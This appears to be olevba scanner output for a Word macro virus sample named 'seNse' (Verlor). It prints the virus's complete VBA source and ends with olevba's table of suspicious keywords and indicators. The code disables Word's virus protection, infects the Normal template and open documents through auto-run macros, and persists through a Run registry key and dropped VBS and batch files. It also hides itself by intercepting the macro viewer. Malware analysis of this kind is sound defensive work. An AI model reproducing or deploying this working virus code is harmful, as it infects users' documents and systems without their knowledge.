olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Verlor-d1cd1175952cd8d86f05489fa088d5efb822333f
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Verlor-d1cd1175952cd8d86f05489fa088d5efb822333f 
in file: Virus.MSWord.Verlor-d1cd1175952cd8d86f05489fa088d5efb822333f - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
 Call Stealth
End Sub
Sub AutoClose()
On Error Resume Next

'MyName = seNse
'WrittenBy = f0re
'SpecialTanksTo = Flitnic
'Version = .C (1.1)

'I have written three different stealth viruses, each using their own technique. This is the
'second in the series and its based on an idea by flitnic. The virus uses an external batch
'file to reinfect the normal template. Put this code in a module called "seNse". Of course
'this is not perfect stealth, though a nice compact attempt :). To maintain readability i
'have not included ani antiheuristics in this code (check out m00d for anti heuristics).
'If you find any errors please let me know.

Options.VirusProtection = False: Options.ConfirmConversions = False: Options.SaveNormalPrompt = False
windir = Environ("windir")

If Dir(NormalTemplate.FullName) = "" Then GoTo EndSub
SetAttr NormalTemplate.FullName, vbNormal

If NormalTemplate.VBProject.VBComponents.Item("seNse").CodeModule.Lines(7, 1) <> "'MyName = seNse" Then
ActiveDocument.vbproject.vbcomponents("seNse").export (windir & "\tempad.dll")
NormalTemplate.vbproject.vbcomponents.import (windir & "\tempad.dll")
NormalTemplate.Save
End If
If ActiveDocument.VBProject.VBComponents.Item("seNse").CodeModule.Lines(7, 1) <> "'MyName = seNse" Then
NormalTemplate.vbproject.vbcomponents("seNse").export (windir & "\tempnt.dll")
ActiveDocument.vbproject.vbcomponents.import (windir & "\tempnt.dll")
ActiveDocument.SaveAs ActiveDocument.FullName
End If

If Dir(windir & "\seNse.vbs") <> "" Then Kill (windir & "\seNse.vbs")
If Dir(windir & "\seNse.dll") <> "" Then Kill (windir & "\seNse.dll")

NormalTemplate.VBProject.VBComponents("seNse").Export (windir & "\seNse.dll")
System.PrivateProfileString("", "HKEY_CURRENT_USER\software\microsoft\windows\CurrentVersion\run", "seNse") = windir & "\seNse.vbs"

Open windir & "\seNse.vbs" For Append As #1
Print #1, "On error resume next"
Print #1, "Set WordObj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "WordObj.Options.SaveNormalPrompt = False"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.remove WordObj.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "seNse" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "WordObj.NormalTemplate.VBProject.VBComponents.import (" & Chr(34) & windir & "\seNse.dll" & Chr(34) & ")"
Print #1, "WordObj.NormalTemplate.save"
Print #1, "set NT = nothing"
Print #1, "WordObj.Quit"
Close #1

EndSub:
End Sub
Sub Stealth()

windir = Environ("windir")
If Dir(windir & "\System\id.sys") <> "" Then Kill windir & "\System\id.sys"
If Dir(windir & "\System\seNse.bat") <> "" Then Kill windir & "\System\seNse.bat"

NormalTemplate.OpenAsDocument
NTAtt = ActiveDocument.ReadOnly
ActiveDocument.SaveAs FileName:=windir & "\System\id.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved = True
ActiveDocument.Saved = True
ActiveDocument.Close

Close #1
Open windir & "\System\seNse.bat" For Append As #1
Print #1, ":Begin"
For i = 1 To 500
Print #1, "rem seNse was coded by f0re [UC/Skamwerks/DVC]"
Next i
Print #1, ":Begin"
Print #1, "Move /y " & Chr(34) & "c:\windll.dat" & Chr(34) & " " & Chr(34) & NormalTemplate.FullName & Chr(34)
Print #1, "If exist c:\windll.dat goto Begin"
Close #1

FileCopy windir & "\System\id.sys", "c:\windll.dat"
NTReturn = Shell(windir & "\System\seNse.bat", 0)
End Sub
Sub ViewVBCode()
On Error Resume Next

NormalTemplate.VBProject.VBComponents("seNse").CodeModule.deletelines 1, NormalTemplate.VBProject.VBComponents("seNse").CodeModule.CountOfLines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("seNse")
NormalTemplate.Saved = True
Docnumber = Application.Documents.Count
If  docnumber >= 1 Then
 For X = 1 to docnumber
  Documents(X).VBProject.VBComponents("seNse").CodeModule.deletelines 1, Documents(X).VBProject.VBComponents("seNse").CodeModule.CountOfLines
  Documents(X).Saved = True
  Documents(X).VBProject.VBComponents.Remove Documents(X).VBProject.VBComponents("seNse")
  Documents(X).Saved = True
 Next X
End If

Application.ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
On Error Resume Next

For X = 1 To NormalTemplate.VBProject.VBComponents("seNse").CodeModule.CountOfLines
 CodeNT = CodeNT & NormalTemplate.VBProject.VBComponents("seNse").CodeModule.Lines(X, 1) & Chr(13)
Next X
NormalTemplate.VBProject.VBComponents("seNse").CodeModule.deletelines 1, NormalTemplate.VBProject.VBComponents("seNse").CodeModule.CountOfLines
NormalTemplate.Saved = True
Docnumber = Application.Documents.Count 
If docnumber >= 1 Then
 For X = 1 To ActiveDocument.VBProject.VBComponents("seNse").CodeModule.CountOfLines
  CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("seNse").CodeModule.Lines(X, 1) & Chr(13)
 Next X
 For X = 1 to docnumber
  Documents(X).VBProject.VBComponents("seNse").CodeModule.deletelines 1, Documents(X).VBProject.VBComponents("seNse").CodeModule.CountOfLines
  Documents(X).Saved = True
 Next X
End If

Application.Dialogs(wdDialogToolsMacro).Show

If Application.ShowVisualBasicEditor = False Then
 NormalTemplate.VBProject.VBComponents("seNse").CodeModule.InsertLines 1, CodeNT
 NormalTemplate.Save
 If docnumber >= 1 Then
  For X=1 to docnumber
   Documents(X).VBProject.VBComponents("seNse").CodeModule.InsertLines 1, CodeAD
   Documents(X).SaveAs Documents(X).FullName
  Next X
 End If
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |tempad.dll          |Executable file name                         |
|IOC       |tempnt.dll          |Executable file name                         |
|IOC       |seNse.vbs           |Executable file name                         |
|IOC       |seNse.dll           |Executable file name                         |
|IOC       |seNse.bat           |Executable file name                         |
+----------+--------------------+---------------------------------------------+
